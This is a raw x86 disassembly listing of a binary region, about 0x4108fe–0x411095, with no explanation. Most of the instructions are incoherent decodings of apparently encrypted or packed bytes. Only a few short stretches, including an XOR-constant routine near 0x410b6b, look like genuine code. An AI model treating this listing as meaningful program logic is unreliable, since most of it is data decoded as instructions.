  4108fe:	xchg   BYTE PTR [ebx+0x53],al
  410901:	push   esp
  410902:	(bad)  
  410903:	or     DWORD PTR [edx+0x75],ebx
  410906:	pop    ebx
  410907:	mov    BYTE PTR [eax-0x563763f4],dh
  41090d:	mov    bl,0x47
  41090f:	cmc    
  410910:	push   es
  410911:	jbe    0x410947
  410913:	imul   ecx,DWORD PTR [ecx-0x566dfa93],0x827b1c59
  41091d:	inc    esi
  41091e:	stc    
  41091f:	and    DWORD PTR [esi],0xffffffb9
  410922:	in     al,dx
  410923:	gs jno 0x4108f1
  410926:	cdq    
  410927:	aam    0xc0
  410929:	retf   
  41092a:	js     0x41098c
  41092c:	sbb    ebx,0xae5d6a82
  410932:	xor    BYTE PTR [ebx-0x762d6000],dh
  410938:	push   edi
  410939:	fadd   QWORD PTR [edi]
  41093b:	fsub   DWORD PTR ds:[edi+0x3594a25c]
  410942:	je     0x4108d6
  410944:	in     eax,0xe0
  410946:	mov    cl,BYTE PTR [edx-0x7]
  410949:	rcl    DWORD PTR [edi-0x7],cl
  41094c:	add    cl,BYTE PTR [ecx-0x578d1906]
  410952:	mov    ecx,0x28512419
  410957:	mov    dl,0xf5
  410959:	push   0x3a
  41095b:	retf   
  41095c:	inc    ecx
  41095d:	push   edi
  41095e:	scas   eax,DWORD PTR es:[edi]
  41095f:	pop    eax
  410960:	repnz mov esp,edx
  410963:	arpl   WORD PTR [esi+0x59],ax
  410966:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410967:	add    cl,BYTE PTR [ebp+0x2d]
  41096a:	xchg   esi,eax
  41096b:	(bad)
  41096e:	mov    cl,0x64
  410970:	pushf  
  410971:	in     al,0x2a
  410973:	popf   
  410974:	ret    
  410975:	mov    eax,ds:0xc5dd9c65
  41097a:	mov    ebx,ecx
  41097c:	leave  
  41097d:	sbb    esi,DWORD PTR [edi]
  41097f:	fwait
  410980:	adc    eax,0xc39ae4e8
  410985:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410986:	out    0x13,eax
  410988:	repz jmp 0xf26fa7c1
  41098e:	mov    edx,0x4cc3e101
  410993:	pusha  
  410994:	adc    bh,bl
  410996:	mov    DWORD PTR [ebx+0x40],ebp
  410999:	and    ecx,DWORD PTR [esi-0x37]
  41099c:	js     0x41092f
  41099e:	xor    DWORD PTR [edx],ebp
  4109a0:	mov    ah,0xd9
  4109a2:	dec    eax
  4109a3:	dec    ecx
  4109a4:	jnp    0x410a0a
  4109a6:	sub    al,0x15
  4109a8:	push   ebp
  4109a9:	out    0xdb,eax
  4109ab:	pop    esp
  4109ac:	leave  
  4109ad:	sbb    eax,0xffdccb4
  4109b2:	scas   eax,DWORD PTR es:[edi]
  4109b3:	mov    al,0xac
  4109b5:	xchg   esp,eax
  4109b6:	daa    
  4109b7:	call   0x9b79:0x84a1cedf
  4109be:	mov    dl,0xe3
  4109c0:	lock jmp 0xd92b:0xa40b04b6
  4109c8:	pop    ds
  4109c9:	rol    ebx,1
  4109cb:	or     al,0x34
  4109cd:	push   esi
  4109ce:	iret   
  4109cf:	cld    
  4109d0:	sub    DWORD PTR [eax-0x49],edx
  4109d3:	xor    al,0x28
  4109d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109d6:	xor    eax,esi
  4109d8:	mov    ch,bh
  4109da:	into   
  4109db:	dec    ebx
  4109dc:	and    DWORD PTR [eax-0x4d],ecx
  4109df:	std    
  4109e0:	imul   esi,DWORD PTR ds:0x5fe0689a,0xffffffc9
  4109e7:	cwde   
  4109e8:	int3   
  4109e9:	ror    BYTE PTR [edi],0xd9
  4109ec:	test   ch,0x13
  4109ef:	push   ss
  4109f0:	cdq    
  4109f1:	jbe    0x4109ac
  4109f3:	cmp    DWORD PTR [ebx+0x19],esp
  4109f6:	loopne 0x4109bf
  4109f8:	push   0xffffffda
  4109fa:	pop    edx
  4109fb:	jmp    0x41098f
  4109fd:	in     eax,0x13
  4109ff:	mov    ds:0xc5e3bfda,al
  410a04:	mov    eax,DWORD PTR [ecx-0x52e0c0d9]
  410a0a:	les    ebx,FWORD PTR [esp+ecx*8]
  410a0d:	jmp    0xd7f4:0xec4f000a
  410a14:	mov    bh,0x68
  410a16:	in     eax,0x1c
  410a18:	icebp  
  410a19:	in     eax,0x22
  410a1b:	dec    ebp
  410a1c:	xchg   edi,eax
  410a1d:	xchg   ebp,eax
  410a1e:	inc    ebx
  410a1f:	lahf   
  410a20:	and    DWORD PTR fs:[edx+0x76],ebp
  410a24:	xchg   edi,eax
  410a25:	fadd   QWORD PTR [edx-0x284b35b0]
  410a2b:	scas   al,BYTE PTR es:[edi]
  410a2c:	call   0x338c:0xbb31b7e4
  410a33:	or     al,0x21
  410a35:	int    0xb0
  410a37:	loopne 0x410ab4
  410a39:	mov    esp,0x7e4f5093
  410a3e:	in     al,dx
  410a3f:	pop    ecx
  410a40:	dec    eax
  410a41:	push   edx
  410a42:	jecxz  0x410a59
  410a44:	js     0x410a06
  410a46:	xchg   edx,eax
  410a47:	pop    eax
  410a48:	out    dx,eax
  410a49:	fs cmp al,0x1b
  410a4c:	push   esi
  410a4d:	cmc    
  410a4e:	jmp    0x410a1e
  410a50:	dec    edx
  410a51:	mov    eax,ds:0xe812d000
  410a56:	add    eax,DWORD PTR [ebx]
  410a58:	mov    al,ds:0x54077caf
  410a5d:	enter  0x1dfb,0xb4
  410a61:	and    cl,ah
  410a63:	mov    al,0xe7
  410a65:	fs push ecx
  410a67:	ds sub al,0x9b
  410a6a:	adc    bl,dl
  410a6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a6d:	inc    esp
  410a6e:	jl     0x410ae1
  410a70:	sti    
  410a71:	mov    ecx,0x4be00f40
  410a76:	outs   dx,BYTE PTR ds:[esi]
  410a77:	ins    DWORD PTR es:[edi],dx
  410a78:	mov    edi,cs
  410a7a:	cwde   
  410a7b:	outs   dx,DWORD PTR ds:[esi]
  410a7c:	sbb    al,0xa7
  410a7e:	repz and DWORD PTR [ebx-0xe],eax
  410a82:	(bad)  
  410a83:	mov    ah,0x14
  410a85:	mov    esi,0x32aaaea7
  410a8a:	out    dx,eax
  410a8b:	sub    eax,0x3d86d346
  410a90:	ror    BYTE PTR ds:0xcc3f6f32,0xcf
  410a97:	push   cs
  410a98:	inc    eax
  410a99:	xor    ebp,eax
  410a9b:	inc    edx
  410a9c:	dec    edi
  410a9d:	hlt    
  410a9e:	ja     0x410b17
  410aa0:	int    0x59
  410aa2:	call   0x4fcd9eea
  410aa7:	in     al,dx
  410aa8:	jp     0x410b06
  410aaa:	mov    BYTE PTR ds:0x25ea94e,bl
  410ab0:	push   ebx
  410ab1:	ror    DWORD PTR [ecx-0x1e471934],0x12
  410ab8:	das    
  410ab9:	xchg   ebp,eax
  410aba:	lahf   
  410abb:	ins    DWORD PTR es:[edi],dx
  410abc:	or     edx,DWORD PTR [esi]
  410abe:	ja     0x410a40
  410ac0:	adc    DWORD PTR [esi+ebx*8-0x34618cfb],0xa9943dcf
  410acb:	xchg   dx,ax
  410acd:	jge    0x410a88
  410acf:	dec    ecx
  410ad0:	cmp    eax,ebp
  410ad2:	push   0xc59376c3
  410ad7:	jmp    0x7b5683b6
  410adc:	jge    0x410b0e
  410ade:	add    esp,ecx
  410ae0:	pushf  
  410ae1:	pop    esi
  410ae2:	xor    ecx,DWORD PTR [ebx+ecx*2]
  410ae5:	mov    bh,0xe8
  410ae7:	pop    edx
  410ae8:	xor    ah,BYTE PTR [esi-0x26]
  410aeb:	lea    ecx,[ecx+0x3bcf3a42]
  410af1:	out    dx,al
  410af2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410af3:	jge    0x410acb
  410af5:	out    0xf1,eax
  410af7:	mov    dh,0x1
  410af9:	sbb    al,0x16
  410afb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410afc:	inc    esi
  410afd:	xor    eax,0xb0bc1ba7
  410b02:	mov    eax,DWORD PTR [esp+eiz*8]
  410b05:	pop    ss
  410b06:	jge    0x410ab7
  410b08:	(bad)  
  410b09:	out    0x90,eax
  410b0b:	icebp  
  410b0c:	aam    0xab
  410b0e:	pop    edi
  410b0f:	fadd   QWORD PTR [edx+0x54041bb1]
  410b15:	and    BYTE PTR [ebx],ch
  410b17:	inc    esi
  410b18:	fstp   QWORD PTR [ebp+0x465cb075]
  410b1e:	shr    BYTE PTR [ebp+0x2d1d49ba],0xb3
  410b25:	mov    edx,0xc5dfcb18
  410b2a:	jge    0x410ada
  410b2c:	bound  eax,QWORD PTR [ebp-0x7f]
  410b2f:	sbb    DWORD PTR [ecx-0x61ce8991],ebp
  410b35:	sub    cl,BYTE PTR [edi]
  410b37:	inc    edi
  410b38:	pop    esp
  410b39:	adc    BYTE PTR [edi-0x5e174886],ah
  410b3f:	adc    DWORD PTR [esi-0x76],ecx
  410b42:	sbb    BYTE PTR [edx],0xde
  410b45:	test   al,0xdd
  410b47:	(bad)  
  410b48:	sub    edi,DWORD PTR [esi+0x58ddb2a7]
  410b4e:	ss cmp al,0x1a
  410b51:	rol    cl,0x9
  410b54:	inc    edi
  410b55:	push   ebp
  410b56:	daa    
  410b57:	mov    bl,ah
  410b59:	add    esi,DWORD PTR [edx+0x19]
  410b5c:	ror    BYTE PTR [esi+0x6],1
  410b5f:	or     al,0x37
  410b61:	cmp    DWORD PTR [esi+0x54],eax
  410b64:	pop    esi
  410b65:	je     0x410b73
  410b6b:	mov    eax,DWORD PTR [ebp+0x8]
  410b6e:	jmp    0x410b8c
  410b73:	mov    eax,DWORD PTR [ebp-0x4]
  410b76:	xor    eax,edx
  410b78:	add    eax,ecx
  410b7a:	jmp    0x410b8c
  410b7f:	mov    eax,DWORD PTR [ebp-0x4]
  410b82:	xor    eax,0x7510855
  410b87:	add    eax,0x32729c
  410b8c:	leave  
  410b8d:	ret    0x4
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	jmp    0x410f98
  410b98:	outs   dx,DWORD PTR ds:[esi]
  410b99:	mov    WORD PTR ds:0x7191e994,cs
  410b9f:	jae    0x410bc2
  410ba1:	dec    esi
  410ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba3:	repz add ebx,DWORD PTR [eax]
  410ba6:	je     0x410b99
  410ba8:	ds inc edx
  410baa:	jo     0x410c1c
  410bac:	pop    eax
  410bad:	jge    0x410c1f
  410baf:	jo     0x410b49
  410bb1:	jmp    0xec18:0xd3626e15
  410bb8:	push   ebx
  410bb9:	xor    eax,0xa2d6a5f1
  410bbe:	stc    
  410bbf:	inc    esp
  410bc0:	call   0x6f0c:0x327203
  410bc7:	ins    DWORD PTR es:[edi],dx
  410bc8:	nop
  410bc9:	fsubr  st(6),st
  410bcb:	adc    al,0x27
  410bcd:	scas   al,BYTE PTR es:[edi]
  410bce:	ss push eax
  410bd0:	and    esp,DWORD PTR [ecx+0x32c3fca2]
  410bd6:	and    al,0x38
  410bd8:	aas    
  410bd9:	mov    bl,0x56
  410bdb:	adc    cl,BYTE PTR [eax-0x19e4f0a2]
  410be1:	jmp    0x60d0e312
  410be6:	cld    
  410be7:	int3   
  410be8:	lds    esp,FWORD PTR ds:0x94ad8e04
  410bee:	push   es
  410bef:	jp     0x410bfd
  410bf1:	int    0xf0
  410bf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bf4:	xchg   bh,ah
  410bf6:	add    DWORD PTR [eax+0x20],0x8b3998c0
  410bfd:	add    eax,0x78a36dbb
  410c02:	push   es
  410c03:	pop    esp
  410c04:	mov    esp,0xd156d9d2
  410c09:	lods   al,BYTE PTR ds:[esi]
  410c0a:	std    
  410c0b:	mov    eax,0xaf92c3f3
  410c10:	xlat   BYTE PTR ds:[ebx]
  410c11:	imul   edi,DWORD PTR [esp+0xe],0x10c7ddb1
  410c19:	mov    ecx,DWORD PTR [ebx-0x3]
  410c1c:	test   eax,0x3872ad23
  410c21:	dec    edi
  410c22:	jp     0x410c77
  410c24:	mov    al,0x9d
  410c26:	xor    bl,BYTE PTR [eax+0x1af0031c]
  410c2c:	xor    al,0xb8
  410c2e:	xchg   esi,eax
  410c2f:	push   es
  410c30:	cmp    bl,bl
  410c32:	adc    al,0xf4
  410c34:	cld    
  410c35:	jne    0x410bea
  410c37:	aaa    
  410c38:	mov    WORD PTR [eax+esi*8],fs
  410c3b:	mov    ah,0x62
  410c3d:	jecxz  0x410c69
  410c3f:	and    DWORD PTR [ecx-0x3b],ebx
  410c42:	arpl   WORD PTR [edi],ax
  410c44:	ret    0x5c67
  410c47:	into   
  410c48:	fadd   st,st(3)
  410c4a:	ror    DWORD PTR [ebx+0x4b14e616],cl
  410c50:	lock dec ebx
  410c52:	xchg   DWORD PTR [eax+0x1e],esp
  410c55:	mov    eax,0x4b0f79db
  410c5a:	mov    ah,0xcf
  410c5c:	push   edi
  410c5d:	cmc    
  410c5e:	push   edi
  410c5f:	pop    ebx
  410c60:	aas    
  410c61:	xor    ah,ch
  410c63:	inc    eax
  410c64:	outs   dx,BYTE PTR ds:[esi]
  410c65:	stos   BYTE PTR es:[edi],al
  410c66:	add    BYTE PTR [edx],ch
  410c68:	enter  0xdc97,0x9d
  410c6c:	pop    ebp
  410c6d:	jne    0x410c2c
  410c6f:	or     eax,0xf302c165
  410c74:	xor    esp,eax
  410c76:	pop    esp
  410c77:	sti    
  410c78:	out    dx,al
  410c79:	clc    
  410c7a:	inc    edi
  410c7b:	stc    
  410c7c:	fild   QWORD PTR ds:0xf2ff
  410c81:	mov    cl,0xea
  410c83:	xor    DWORD PTR [edx+ebp*8],edx
  410c86:	test   al,0xe6
  410c88:	ins    BYTE PTR es:[edi],dx
  410c89:	bound  ebp,QWORD PTR ds:0x5ab934e0
  410c8f:	dec    ebx
  410c90:	es xor eax,0xb519eacb
  410c96:	pop    ecx
  410c97:	into   
  410c98:	sbb    edx,DWORD PTR [edx]
  410c9a:	test   eax,0x51fe09f7
  410c9f:	lea    ecx,[esi+edi*8-0x26]
  410ca3:	je     0x410d05
  410ca5:	cld    
  410ca6:	scas   al,BYTE PTR es:[edi]
  410ca7:	imul   ebp,esp,0x4b2daf3
  410cad:	mov    ah,0xc
  410caf:	push   ecx
  410cb0:	mov    al,0x26
  410cb2:	and    BYTE PTR [ebx],dh
  410cb4:	aaa    
  410cb5:	add    al,0xf6
  410cb7:	pop    ds
  410cb8:	int3   
  410cb9:	adc    BYTE PTR [ebx],cl
  410cbb:	xlat   BYTE PTR ds:[ebx]
  410cbc:	fistp  WORD PTR [eax]
  410cbe:	lods   al,BYTE PTR ds:[esi]
  410cbf:	jno    0x410cb1
  410cc1:	cld    
  410cc2:	inc    edx
  410cc3:	icebp  
  410cc4:	pop    edx
  410cc5:	std    
  410cc6:	jmp    0x410c8c
  410cc8:	(bad)  
  410cc9:	xchg   ecx,eax
  410cca:	(bad)  
  410ccb:	imul   edx,DWORD PTR [edx+ecx*4-0x4886baed],0xffffffc4
  410cd3:	mov    eax,ds:0x9a872d25
  410cd8:	adc    eax,0x2df5b333
  410cdd:	xlat   BYTE PTR ds:[ebx]
  410cde:	pop    es
  410cdf:	jno    0x410d37
  410ce1:	xor    BYTE PTR [esi+0x483a441b],0xb7
  410ce8:	push   ebp
  410ce9:	push   ss
  410cea:	mov    eax,0xebfa4bcd
  410cef:	bnd jp 0x410ce0
  410cf2:	into   
  410cf3:	data16 sub al,0xea
  410cf6:	lea    ebx,[esi]
  410cf8:	sbb    DWORD PTR [ecx-0x204be0de],edi
  410cfe:	stc    
  410cff:	pop    DWORD PTR [edi]
  410d01:	dec    edx
  410d02:	and    esi,DWORD PTR [edi]
  410d04:	inc    esi
  410d05:	mov    ch,0xb1
  410d07:	pop    es
  410d08:	gs shl bl,1
  410d0b:	push   esp
  410d0c:	aad    0x38
  410d0e:	push   edx
  410d0f:	jg     0x410cb7
  410d11:	cs and ebp,ecx
  410d14:	xchg   ebx,eax
  410d15:	pusha  
  410d16:	mov    al,0x86
  410d18:	sub    al,0xee
  410d1a:	not    BYTE PTR ds:0xe8fea84e
  410d20:	sub    DWORD PTR [esi+ecx*8-0x4],eax
  410d24:	jl     0x410cf5
  410d26:	xlat   BYTE PTR ds:[ebx]
  410d27:	ret    
  410d28:	(bad)  
  410d29:	aad    0x6e
  410d2b:	cwde   
  410d2c:	adc    dh,bh
  410d2e:	pop    ecx
  410d2f:	repz inc esi
  410d31:	pop    esp
  410d32:	inc    edi
  410d33:	inc    esp
  410d34:	push   esp
  410d35:	push   cs
  410d36:	jp     0x410d5c
  410d38:	adc    eax,0xf3c91d6d
  410d3d:	mov    ebp,0x30dd300d
  410d42:	add    eax,0x4dba1a98
  410d47:	das    
  410d48:	(bad)
  410d4b:	mov    ebp,0x7b2ce9c1
  410d50:	aas    
  410d51:	or     BYTE PTR ds:0x7a1fefd7,0x1f
  410d58:	gs cmp bl,bl
  410d5b:	pop    edi
  410d5c:	test   BYTE PTR [eax-0x5b9972f],ah
  410d62:	dec    ebp
  410d63:	fidiv  DWORD PTR [ecx+0x4d]
  410d66:	outs   dx,DWORD PTR ds:[esi]
  410d67:	fcmovu st,st(7)
  410d69:	pextrw esi,(bad),0xc5
  410d6b:	aaa    
  410d6c:	mov    ds:0x854a2eb0,al
  410d71:	in     eax,dx
  410d72:	das    
  410d73:	jl     0x410cf5
  410d75:	push   edx
  410d76:	std    
  410d77:	iret   
  410d78:	sub    eax,0x8ca0b301
  410d7d:	in     eax,0x8f
  410d7f:	popf   
  410d80:	lods   al,BYTE PTR ds:[esi]
  410d81:	sub    eax,0x1cbccc33
  410d86:	dec    esp
  410d87:	mov    al,ds:0x50876a42
  410d8c:	(bad)  
  410d8d:	fcomp  QWORD PTR [esi+esi*1]
  410d90:	pop    edx
  410d91:	repz dec ecx
  410d93:	fist   WORD PTR [eax-0x71]
  410d96:	pop    ebp
  410d97:	inc    eax
  410d98:	out    dx,eax
  410d99:	loope  0x410d2d
  410d9b:	or     al,0x4
  410d9d:	(bad)  
  410d9e:	(bad)  
  410da0:	rcr    bl,0x25
  410da3:	loopne 0x410dd4
  410da5:	xchg   esp,eax
  410da6:	loop   0x410d44
  410da8:	int3   
  410da9:	popa   
  410daa:	push   0xffffff81
  410dac:	pop    eax
  410dad:	xchg   esi,eax
  410dae:	push   edx
  410daf:	mov    al,0x43
  410db1:	mov    eax,ds:0xb3d61f
  410db6:	fwait
  410db7:	imul   ecx,DWORD PTR [edi+edx*4],0x7a92ebc9
  410dbe:	adc    BYTE PTR [ebx+0x6a],0x6a
  410dc2:	push   ebx
  410dc3:	push   cs
  410dc4:	pushf  
  410dc5:	pusha  
  410dc6:	daa    
  410dc7:	out    dx,eax
  410dc8:	shr    DWORD PTR [ecx-0x2b],0xdb
  410dcc:	int3   
  410dcd:	or     edi,DWORD PTR [esi-0x7ac3cb0c]
  410dd3:	nop
  410dd4:	push   edx
  410dd5:	pop    edx
  410dd6:	push   edx
  410dd7:	fs in  eax,dx
  410dd9:	dec    edi
  410dda:	mov    gs,esi
  410ddc:	and    DWORD PTR ds:0xe49093a0,esp
  410de2:	imul   esi,edi,0x4
  410de5:	sbb    al,0xa8
  410de7:	inc    esp
  410de8:	out    0xa9,al
  410dea:	jo     0x410d9d
  410dec:	sub    ch,ch
  410dee:	add    BYTE PTR [edx+0x68],dh
  410df1:	test   bh,ch
  410df3:	add    eax,0x708856ae
  410df8:	cmp    al,0xff
  410dfa:	add    al,0xe
  410dfc:	aad    0xc0
  410dfe:	cmc    
  410dff:	aaa    
  410e00:	dec    ebp
  410e01:	and    al,0x17
  410e03:	daa    
  410e04:	sbb    BYTE PTR [ecx],ch
  410e06:	int3   
  410e07:	lahf   
  410e08:	repnz cmp DWORD PTR [esi-0x58b85a58],0xab6dee05
  410e13:	add    DWORD PTR [eax+0x1821d1e0],edx
  410e19:	cli    
  410e1a:	mov    edi,0x9d2be553
  410e1f:	mov    bl,0xe4
  410e21:	hlt    
  410e22:	outs   dx,BYTE PTR ds:[esi]
  410e23:	dec    ebx
  410e24:	in     eax,0xaf
  410e26:	fistp  QWORD PTR [ebx+0x20]
  410e29:	push   esi
  410e2a:	push   eax
  410e2b:	xchg   ebp,eax
  410e2c:	js     0x410dff
  410e2e:	sub    BYTE PTR [edi+edx*2-0x60],cl
  410e32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e33:	pop    ss
  410e34:	addr16 push eax
  410e36:	aaa    
  410e37:	pop    ebx
  410e38:	or     eax,0x3c8aaf25
  410e3d:	adc    dl,dl
  410e3f:	push   0xe705fea9
  410e44:	add    al,0x95
  410e46:	sbb    BYTE PTR [eax],bl
  410e48:	(bad)  
  410e49:	loope  0x410e18
  410e4b:	mov    cl,0xd0
  410e4d:	loop   0x410e84
  410e4f:	fbstp  TBYTE PTR [edi+edx*2-0x49ee6b40]
  410e56:	test   al,0x33
  410e58:	jmp    0x950f:0x98eb7c04
  410e5f:	ins    DWORD PTR es:[edi],dx
  410e60:	stos   DWORD PTR es:[edi],eax
  410e61:	lods   al,BYTE PTR ds:[esi]
  410e62:	aas    
  410e63:	jne    0x410e9a
  410e65:	push   0x58
  410e67:	das    
  410e68:	add    DWORD PTR [eax+0x6459b6f6],eax
  410e6e:	xchg   DWORD PTR [edx-0x3710491b],esp
  410e74:	in     al,dx
  410e75:	pop    es
  410e76:	push   edi
  410e77:	pusha  
  410e78:	inc    edi
  410e79:	jne    0x410e98
  410e7b:	lods   eax,DWORD PTR ds:[esi]
  410e7c:	xor    esi,ebp
  410e7e:	cmp    al,0xb2
  410e80:	jecxz  0x410e0f
  410e82:	sub    al,0x9b
  410e84:	inc    esi
  410e85:	cmp    edx,DWORD PTR [ecx-0x35fb7d2f]
  410e8b:	test   DWORD PTR [ecx+0x6f],eax
  410e8e:	into   
  410e8f:	imul   edi,DWORD PTR [ecx-0x1d],0xf9703f97
  410e96:	popa   
  410e97:	cmp    eax,0xec269120
  410e9c:	cmp    bl,BYTE PTR [ecx+0x30a7704b]
  410ea2:	mov    fs,WORD PTR [ecx]
  410ea4:	mov    ch,BYTE PTR [edi+0x1c]
  410ea7:	xchg   ecx,eax
  410ea8:	mov    bl,0xd3
  410eaa:	cmc    
  410eab:	dec    esp
  410eac:	outs   dx,BYTE PTR ds:[esi]
  410ead:	cwde   
  410eae:	stc    
  410eaf:	mov    dl,0xc5
  410eb1:	push   edi
  410eb2:	outs   dx,DWORD PTR ds:[esi]
  410eb3:	and    bh,ch
  410eb5:	cmp    ebx,DWORD PTR [ecx+0x2d]
  410eb8:	arpl   bp,di
  410eba:	jle    0x410e74
  410ebc:	mov    dl,0x79
  410ebe:	cwde   
  410ebf:	retf   
  410ec0:	setae  BYTE PTR [esi+0x1f84cd4c]
  410ec7:	mov    eax,0x6a2c3c91
  410ecc:	and    eax,DWORD PTR [esi+ecx*2]
  410ecf:	and    al,BYTE PTR [ebx-0x38]
  410ed2:	iret   
  410ed3:	dec    edx
  410ed4:	xchg   edx,eax
  410ed5:	cwde   
  410ed6:	push   ds
  410ed7:	test   eax,0x1c1d61a
  410edc:	cmp    eax,0x3fcd897
  410ee1:	stc    
  410ee2:	xchg   esp,eax
  410ee3:	xchg   esp,eax
  410ee4:	in     eax,0xab
  410ee6:	ss mov ch,0x45
  410ee9:	cmp    DWORD PTR [esp+eax*2],ecx
  410eec:	add    ecx,DWORD PTR [edi-0x474768a7]
  410ef2:	lahf   
  410ef3:	push   ebx
  410ef4:	xchg   ebp,eax
  410ef5:	(bad)  
  410ef6:	cmp    eax,0xf8b3c84e
  410efb:	js     0x410f16
  410efd:	inc    edx
  410efe:	pop    esi
  410eff:	inc    edx
  410f00:	push   edi
  410f01:	imul   ebp,edx,0xfe7f3039
  410f07:	fs adc eax,0x71df8718
  410f0d:	dec    ecx
  410f0e:	rol    BYTE PTR [edi+0x75],1
  410f11:	repnz push ebp
  410f13:	enter  0xb2ec,0x8c
  410f17:	xchg   ebp,eax
  410f18:	lock jmp 0x4634724e
  410f1e:	ret    0x3cba
  410f21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f22:	into   
  410f23:	inc    ebx
  410f24:	pop    ecx
  410f25:	xchg   ebp,eax
  410f26:	push   ecx
  410f27:	add    ecx,DWORD PTR [esi+0x369802a4]
  410f2d:	jbe    0x410f4a
  410f2f:	mov    edi,0xb992a2e6
  410f34:	mov    WORD PTR [ebp-0x4b],gs
  410f37:	xor    eax,0x2dfb3747
  410f3c:	test   eax,0x38be091f
  410f41:	(bad)  
  410f42:	pop    ds
  410f43:	jo     0x410ec9
  410f45:	lock std 
  410f47:	nop
  410f48:	cmp    al,0xd4
  410f4a:	mov    ds:0xb839155f,eax
  410f4f:	cmp    al,0x46
  410f51:	sbb    al,0x95
  410f53:	mov    ch,0x15
  410f55:	dec    esi
  410f56:	mov    WORD PTR [edx-0x49],es
  410f59:	mul    bh
  410f5b:	in     al,dx
  410f5c:	sbb    cl,0x3
  410f5f:	imul   edx,esp,0xbc33ba93
  410f65:	clc    
  410f66:	and    BYTE PTR [ebx+0x9],0x14
  410f6a:	int3   
  410f6b:	gs das 
  410f6d:	mov    edx,0x9d2d581b
  410f72:	rcl    DWORD PTR [ebx],1
  410f74:	stc    
  410f75:	ins    DWORD PTR es:[edi],dx
  410f76:	fisub  WORD PTR [ebx+ecx*4+0x0]
  410f7a:	gs xchg ebx,eax
  410f7c:	imul   ecx,DWORD PTR [eax+0x224c3c98],0xffffff99
  410f83:	sub    DWORD PTR [edi-0x390c05cb],edx
  410f89:	dec    ecx
  410f8a:	push   es
  410f8b:	xchg   BYTE PTR [edi+0x41],al
  410f8e:	dec    eax
  410f8f:	mov    ch,0x1b
  410f91:	lods   eax,DWORD PTR ds:[esi]
  410f92:	adc    cl,al
  410f94:	(bad)  
  410f95:	sub    eax,0x2ca1e481
  410f9a:	mov    dl,0x41
  410f9c:	add    BYTE PTR [edx+0x32729c],bh
  410fa2:	sub    eax,edx
  410fa4:	adc    DWORD PTR ds:0x42fd6e,ebx
  410faa:	mov    ecx,0x7510855
  410faf:	push   esi
  410fb0:	mov    esi,DWORD PTR [ebp+0xc]
  410fb3:	xor    eax,ecx
  410fb5:	mov    DWORD PTR ds:0x42e11c,0x4b31
  410fbf:	jmp    0x4113c4
  410fc4:	xchg   edx,eax
  410fc5:	shl    DWORD PTR [edi+eiz*8+0x71516771],cl
  410fcc:	push   ebp
  410fcd:	paddsw mm6,QWORD PTR [eax+0x33911ba0]
  410fd4:	es dec esi
  410fd6:	jo     0x411048
  410fd8:	pop    eax
  410fd9:	jge    0x41104b
  410fdb:	jo     0x410fa9
  410fdd:	and    al,0xdf
  410fdf:	popa   
  410fe0:	js     0x410f88
  410fe2:	stos   DWORD PTR es:[edi],eax
  410fe3:	push   ebp
  410fe4:	in     al,0xd3
  410fe6:	sbb    BYTE PTR [edx-0x7c],bh
  410fe9:	lock xor bl,BYTE PTR [ecx]
  410fec:	imul   esi,ecx,0xffffffe2
  410fef:	push   eax
  410ff0:	sub    BYTE PTR [ebx],ah
  410ff2:	mov    dh,0x7e
  410ff4:	mov    eax,0xe0dbb1d3
  410ff9:	es xchg edi,eax
  410ffb:	cdq    
  410ffc:	cmp    BYTE PTR [esi-0x62],al
  410fff:	xor    BYTE PTR [edx+0x5f3abc0c],ch
  411005:	jge    0x411021
  411007:	ds scas al,BYTE PTR es:[edi]
  411009:	pop    edx
  41100a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41100c:	adc    al,0xea
  41100e:	data16 arpl bp,cx
  411011:	xchg   esp,eax
  411012:	adc    BYTE PTR [edi+0x5e64dc6d],cl
  411018:	push   eax
  411019:	outs   dx,DWORD PTR ds:[esi]
  41101a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41101b:	stos   BYTE PTR es:[edi],al
  41101c:	stc    
  41101d:	xchg   ebp,eax
  41101e:	mov    ch,0xaa
  411020:	ret    0x1b62
  411023:	clc    
  411024:	pop    esp
  411025:	js     0x410fc6
  411027:	out    0x82,al
  411029:	scas   al,BYTE PTR es:[edi]
  41102a:	inc    ebp
  41102b:	in     eax,dx
  41102c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41102d:	ret    
  41102e:	and    dl,bh
  411030:	shl    BYTE PTR [eax+0x277ec4d1],cl
  411036:	stc    
  411037:	into   
  411038:	mov    edi,ss
  41103a:	add    bl,BYTE PTR [ebx]
  41103c:	mov    DWORD PTR [eax+edx*8+0x75],ecx
  411040:	mov    bl,0xf5
  411042:	imul   esi,DWORD PTR [ebx-0x4b7b913d],0xffffffbe
  411049:	xchg   edx,eax
  41104a:	outs   dx,DWORD PTR ds:[esi]
  41104b:	out    dx,eax
  41104c:	inc    bl
  41104e:	inc    eax
  41104f:	call   0x5d8f824e
  411054:	adc    bl,bh
  411056:	pop    eax
  411057:	dec    ebp
  411058:	and    DWORD PTR [eax],ebp
  41105a:	sub    DWORD PTR [ebp-0x46],edx
  41105d:	sub    al,0xf7
  41105f:	jl     0x41109a
  411061:	popf   
  411062:	in     al,dx
  411063:	cwde   
  411064:	or     eax,0x654698e0
  411069:	xor    eax,0x6af97764
  41106e:	pop    esi
  41106f:	adc    ah,BYTE PTR [edx+ebp*4+0x2a]
  411073:	xchg   ebx,eax
  411074:	mov    ch,0x64
  411076:	mov    al,0x78
  411078:	mov    esp,0x5e72bc36
  41107d:	push   0xffffffae
  41107f:	fsubr  QWORD PTR [eax+0x55d4f1e8]
  411085:	jo     0x411103
  411087:	int3   
  411088:	add    eax,0x30abe9cf
  41108d:	dec    ecx
  41108e:	aaa    
  41108f:	or     bh,bh
  411091:	icebp  
  411092:	daa    
  411093:	mov    dl,0xe3
  411095:	mov    bh,cl
